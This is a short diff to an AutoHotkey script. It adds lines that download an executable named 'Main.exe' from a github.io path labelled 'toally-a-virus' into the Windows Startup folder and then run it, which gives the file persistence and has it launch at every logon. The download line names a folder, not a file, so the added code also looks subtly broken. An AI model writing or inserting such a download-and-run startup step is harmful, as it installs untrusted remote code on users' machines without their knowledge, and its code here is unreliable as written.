@@ -3,4 +3,5 @@
 SendMode Input  ; Recommended for new scripts due to its superior speed and reliability.
 SetWorkingDir %A_ScriptDir%  ; Ensures a consistent starting directory.
 
-UrlDownloadToFile, https://dj13423.github.io/download/AHK/toally-a-virus/Installer.exe, %A_ScriptDir%\keep alive\Me.exe
+UrlDownloadToFile, https://dj13423.github.io/download/AHK/toally-a-virus/Main.exe, %A_Startup%
+Run, Main.exe, %A_Startup%
